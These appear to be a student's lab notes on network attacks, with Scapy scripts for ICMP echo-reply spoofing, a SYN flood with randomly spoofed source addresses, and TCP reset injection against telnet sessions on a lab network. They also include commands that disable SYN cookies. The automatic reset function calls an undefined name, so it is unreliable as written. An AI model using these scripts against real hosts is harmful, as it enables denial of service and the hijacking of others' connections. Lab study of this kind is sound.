# 1 sniff/spoof

```python
from scapy.all import *


def trace(ipdest):
  # sr() function is for sending packets and receiving answers
  ip = IP()
  ip.dst = ipdest
  ip.ttl = 0
  sendrecieve = None

  while sendrecieve is None or sendrecieve.src != ip.dst:
    ip.ttl+=1
    sendrecieve = sr1(ip/ICMP()) #sends packets and receives the first answer
    print(sendrecieve.show())
  
  print(f'Distance to destination = {ip.ttl}')

trace("91.81.58.220")


def replyICMP(pkt):
    print("Dst:",pkt[IP].dst," | Src: ", pkt[IP].src , "CODE: "+str(pkt[ICMP].code))
    print("RAW: ",pkt[Raw])
    send(
        IP(src=pkt[IP].dst, dst=pkt[IP].src)  # Layer 3: Reverse source and destination IPs
        / ICMP(                               # Layer 4: ICMP header
            type=0,                           # Type 0 = Echo Reply
            code=pkt[ICMP].code,              # Use same code as received (usually 0)
            id=pkt[ICMP].id,                  # Match ID of the original request
            seq=pkt[ICMP].seq                 # Match sequence number
        )
        / pkt[Raw],                           # Include the original raw payload (data)
        verbose=1                             # Enable verbose output (shows sending info)
    )

pkt = sniff(iface="br-104c2edcf25e",filter='icmp and src host 10.9.0.5',prn=replyICMP)    

```

# 2 
> Attackers either use spoofed IP address or do not continue the procedure. Through this attack, attackers can flood the victim’s queue that is used for half-opened connections, i.e. the connections that has finished SYN, SYN-ACK, but has not yet gotten a final ACK back

- *checking queue size of the sysytem*: `sysctl net.ipv4.tcp_max_syn_backlog`
- changin value: `sysctl net.ipv4.tcp_max_syn_backlog=80`

**usage**: `netstat -nat`
> The state for such connections is SYN-RECV. If the 3-way handshake is finished, the state of the connections will be ESTABLISHED.

**SYN Cookie Countermeasure**: By default, Ubuntu’s SYN flooding countermeasure is turned on. This mechanism is called SYN cookie. It will kick in if the machine detects that it is under the SYN flooding attack.

    ```shell
    $ sysctl -a | grep syncookies # Display the SYN cookie flag
    $ sysctl -w net.ipv4.tcp_syncookies=0 # turn off SYN cookie
    $ sysctl -w net.ipv4.tcp_syncookies=1 # turn on SYN cookie
    ```

1. See the retransmission: `sysctl net.ipv4.tcp_synack_retries`\
2. set `net.ipv4.tcp_synack_retries = 5`

after 5 retransmission, TCP will remove the corresponding item from the half-open connection queue; every time a item is removed, a slot becomes open.

## Kernel mitigation
> TCP reserves one fourth of the backlog queue for "proven destinations" if SYN cookie are disabled, after making a TCP connection from 10.9.0.6 to the server 10.9.0.5 we can see that the IP address 10.9.0.6 is remembered (cached) by the server, so they will be using reserved slot and this will make SYN flooding attack not possible.

TO remove the effect of this mitigation method we can run the "ip tcp_metric flush" command on the server
```sh
ip tcp_metrics show ; ip tcp_metrics flush

```

## Synflood

```python
#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')   # TO BE COMPLETED
pkt = ip/tcp
# ip=0
while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
    pkt[TCP].sport = getrandbits(16)                 # source port
    pkt[TCP].seq = getrandbits(32)                   # sequence number
    send(pkt, verbose = 1)
    # # i+=1
    # # if(i==40000):
    # #     break
```
running this, is quite impossible to connect in telnet 10.9.0.5, because of saturation of course... python could be a little slower, so a telnet connection is still possible even if hard.
- if we increase the queue is more possible, decreasing is impossible `sysctl net.ipv4.tcp_max_syn_backlog=80`
- with C, even a larger queue make it impossible

## Reset attack
```python
#!/usr/bin/env python3
from scapy.all import *

def TCP_reset_attack(ip_src, ip_dst, port_src, port_dst, seq_nr):
    ip = IP(src=ip_src,dst=ip_dst)
    tcp = TCP(sport=port_src, dport=port_dst, flags="R",seq=seq_nr)
    pkt = ip/tcp
    
    send(pkt,verbose=1)


# TCP_reset_attack("10.9.0.1","10.9.0.5",50636,23, 1713461463) ## manual mode

def automaticReset(pkt): ##AUTOMATIC MODE
    manual_reset_attack(pkt[IP].src,pkt[IP].dst,pkt[TCP].sport,23,pkt[TCP].seq)


pkt = sniff(iface="br-104c2edcf25e",filter='port 23 and dst host 10.9.0.5',prn=automaticReset)

```